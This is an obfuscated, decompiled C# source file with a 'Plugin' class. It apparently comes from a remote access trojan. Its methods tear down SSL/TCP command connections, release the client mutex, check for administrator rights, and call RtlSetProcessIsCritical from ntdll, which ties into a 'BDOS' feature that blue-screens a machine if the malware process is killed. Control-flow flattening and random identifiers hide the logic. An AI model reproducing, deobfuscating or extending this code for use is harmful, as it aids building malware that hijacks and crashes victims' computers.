using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using Microsoft.Win32;

namespace Plugin;

public static class Methods
{
	private static Methods YodHOGSCRhgISDXhUW;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void ClientExit()
	{
		switch (1)
		{
		case 0:
			break;
		case 1:
			try
			{
				int num;
				if (!NdRUhEL7yIV50NiuCI(Plugin.BDOS, j8NQFMPFbUQV9kOvG1.kHRbAiSgQ))
				{
					num = 8;
					goto IL_0048;
				}
				goto IL_00cd;
				IL_00cd:
				if (IsAdmin())
				{
					num = 7;
					if (!aHcm2XwV29XM88ZOd9())
					{
						goto IL_0044;
					}
					goto IL_0048;
				}
				goto IL_00ab;
				IL_0048:
				int num2 = default(int);
				while (true)
				{
					switch (num)
					{
					case 1:
						return;
					case 2:
						return;
					case 6:
						break;
					case 5:
					case 8:
						goto end_IL_0048;
					case 7:
						goto IL_00ba;
					default:
						goto IL_00cd;
					case 3:
					case 4:
						goto IL_0105;
					}
					object obj = PFVsx0f2jXmlDWE0ny();
					if (obj == null)
					{
						num = 4;
						continue;
					}
					PePixG8Atavy7675C4(obj, JZGqsP7dTwImnY3EdB.FjmkrArKb);
					num = 3;
					continue;
					IL_0105:
					object obj2 = CUPWy9ra8BRBGxj22c();
					if (obj2 == null)
					{
						num = 1;
						if (yaIFu9sFOqM36waPMf() == null)
						{
							continue;
						}
						goto IL_0044;
					}
					PePixG8Atavy7675C4(obj2, JZGqsP7dTwImnY3EdB.YiYWrOvN1);
					num = 2;
					continue;
					IL_00ba:
					apcLAgPqWn7G3SUSm1();
					num2 = 5;
					goto IL_0044;
					continue;
					end_IL_0048:
					break;
				}
				goto IL_00ab;
				IL_0044:
				num = num2;
				goto IL_0048;
				IL_00ab:
				oTWrE76ScuK5x3Vnd1();
				num = 6;
				goto IL_0048;
			}
			catch
			{
				int num3 = 0;
				if (!aHcm2XwV29XM88ZOd9())
				{
					int num4 = default(int);
					num3 = num4;
				}
				switch (num3)
				{
				case 0:
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static bool IsAdmin()
	{
		return AemF1BqUhMmGuZvqpN.M2CdmcGqT(new WindowsPrincipal((WindowsIdentity)xawF92Hias7huWXfVC(nulMTpXt7OUPNcx0IH.zcKwB8Y5y)), WindowsBuiltInRole.Administrator, AemF1BqUhMmGuZvqpN.yx7zbX1ZX);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void CloseMutex()
	{
		int num = 2;
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				default:
					PePixG8Atavy7675C4(Plugin.AppMutex, JZGqsP7dTwImnY3EdB.DXAdhJF28h);
					num2 = 3;
					if (aHcm2XwV29XM88ZOd9())
					{
						continue;
					}
					break;
				case 3:
					Plugin.AppMutex = null;
					num2 = 4;
					if (aHcm2XwV29XM88ZOd9())
					{
						continue;
					}
					break;
				case 1:
					return;
				case 4:
					return;
				case 2:
					if (Plugin.AppMutex == null)
					{
						num2 = 1;
						if (aHcm2XwV29XM88ZOd9())
						{
							num2 = 1;
						}
						continue;
					}
					goto default;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
	{
		int num = 3;
		int num2 = num;
		while (true)
		{
			switch (num2)
			{
			default:
				return;
			case 0:
				return;
			case 1:
				return;
			case 2:
				if (!tA6SnRVgiKLn9KgTRE())
				{
					num2 = 0;
					if (aHcm2XwV29XM88ZOd9())
					{
						num2 = 0;
					}
					break;
				}
				goto case 4;
			case 4:
				apcLAgPqWn7G3SUSm1();
				num2 = 0;
				if (aHcm2XwV29XM88ZOd9())
				{
					num2 = 1;
				}
				break;
			case 3:
				if (!NdRUhEL7yIV50NiuCI(Plugin.BDOS, j8NQFMPFbUQV9kOvG1.kHRbAiSgQ))
				{
					return;
				}
				num2 = 2;
				if (!aHcm2XwV29XM88ZOd9())
				{
					num2 = 0;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void ProcessCriticalExit()
	{
		switch (1)
		{
		case 1:
			try
			{
				RtlSetProcessIsCritical(0u, 0u, 0u);
				int num = 0;
				if (yaIFu9sFOqM36waPMf() == null)
				{
					num = 0;
				}
				switch (num)
				{
				case 0:
					break;
				}
				break;
			}
			catch
			{
				int num2 = 0;
				if (yaIFu9sFOqM36waPMf() != null)
				{
					goto IL_0074;
				}
				goto IL_0078;
				IL_0074:
				int num3 = default(int);
				num2 = num3;
				goto IL_0078;
				IL_0078:
				do
				{
					switch (num2)
					{
					}
					EDi4gtAT7y5M20fUmJ(100000, dm6L8Sddtfk8nZl9TIp.E0Ndx6rYcU);
					num2 = 1;
				}
				while (aHcm2XwV29XM88ZOd9());
				goto IL_0074;
			}
		case 0:
			break;
		}
	}

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool NdRUhEL7yIV50NiuCI(object P_0, object P_1)
	{
		return j8NQFMPFbUQV9kOvG1.M2CdmcGqT((string)P_0, (j8NQFMPFbUQV9kOvG1)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void apcLAgPqWn7G3SUSm1()
	{
		ProcessCriticalExit();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void oTWrE76ScuK5x3Vnd1()
	{
		CloseMutex();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object PFVsx0f2jXmlDWE0ny()
	{
		return Connection.SslClient;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void PePixG8Atavy7675C4(object P_0, object P_1)
	{
		JZGqsP7dTwImnY3EdB.M2CdmcGqT(P_0, (JZGqsP7dTwImnY3EdB)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object CUPWy9ra8BRBGxj22c()
	{
		return Connection.TcpClient;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool aHcm2XwV29XM88ZOd9()
	{
		return YodHOGSCRhgISDXhUW == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static Methods yaIFu9sFOqM36waPMf()
	{
		return YodHOGSCRhgISDXhUW;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object xawF92Hias7huWXfVC(object P_0)
	{
		return nulMTpXt7OUPNcx0IH.M2CdmcGqT((nulMTpXt7OUPNcx0IH)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool tA6SnRVgiKLn9KgTRE()
	{
		return IsAdmin();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void EDi4gtAT7y5M20fUmJ(int P_0, object P_1)
	{
		dm6L8Sddtfk8nZl9TIp.M2CdmcGqT(P_0, (dm6L8Sddtfk8nZl9TIp)P_1);
	}
}
